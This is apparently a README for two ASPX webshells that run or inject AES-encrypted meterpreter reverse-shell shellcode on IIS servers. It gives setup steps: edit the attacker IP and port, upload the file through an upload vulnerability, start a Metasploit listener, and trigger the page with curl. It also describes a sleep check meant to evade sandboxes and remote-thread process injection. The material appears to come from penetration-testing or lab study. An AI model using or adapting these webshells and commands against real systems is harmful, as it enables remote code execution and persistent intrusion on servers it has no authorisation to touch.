# webshells

Two files. Both **standalone** — deploy one or both independently to IIS. They do not depend on each other.

---

## File Roles

| File | Standalone? | What it does | Runs shellcode in... |
|------|-------------|--------------|----------------------|
| `ASPX_Runner64.aspx` | Yes | Shellcode runner | `w3wp.exe` (the IIS worker itself) |
| `ASPX_Inject64.aspx` | Yes | Shellcode injector | Another process (default: `w3wp`) |

Both use **AES-encrypted shellcode** with a runtime-patched LHOST/LPORT — change the IP and port constants at the top of each file, no need to re-encrypt shellcode.

Both include a **5-second sleep sandbox check** — if the sleep is skipped (common in sandboxes/scanners), the shellcode doesn't execute.

---

## ASPX_Runner64.aspx — Runs Inside w3wp.exe

When a browser or `curl` hits the page, it:
1. Sleeps 5 seconds (sandbox check)
2. Decrypts AES shellcode in memory
3. Patches your real LHOST/LPORT into the shellcode
4. `VirtualAlloc` RWX in `w3wp.exe`
5. `Marshal.Copy` shellcode in (chunked, because ASPX doesn't support `/unsafe`)
6. `CreateThread` → your meterpreter session appears as `w3wp.exe`

**Customize before deploying:**
```csharp
string RHOST = "192.168.45.212";   // ← your Kali IP
string RPORT  = "53";              // ← your listener port
```

---

## ASPX_Inject64.aspx — Injects Into Another Process

Same as above but instead of running shellcode in `w3wp.exe`, it:
4. Finds a target process by name (default: `w3wp`)
5. `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` into it

**Customize before deploying:**
```csharp
string RHOST    = "192.168.45.212";  // ← your Kali IP
string RPORT    = "53";              // ← your listener port
string TGT_PROC = "w3wp";           // ← process name to inject into
```

---

## Deployment

```bash
# 1. Edit RHOST/RPORT at the top of whichever file you're using

# 2. Upload to the IIS webroot (requires write access to the server, e.g. via a file upload vuln)
#    Typical paths:
#      C:\inetpub\wwwroot\shell.aspx
#      C:\inetpub\wwwroot\<appname>\shell.aspx

# 3. Start your listener on Kali
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST <YOUR_IP>; set LPORT 53; exploit -j"

# 4. Trigger the webshell
curl http://<TARGET_IP>/shell.aspx
# Or just browse to it
```

---

## Notes

- ASPX files run as the `IIS APPPOOL\<AppPoolName>` identity by default — usually not admin.
- If the app pool runs as a service account or `LocalSystem`, you may get a privileged session.
- The shellcode embedded is a placeholder — it connects to `192.168.45.212:53`. Change `RHOST`/`RPORT` and you're done. No need to touch the encrypted `buf[]` array.
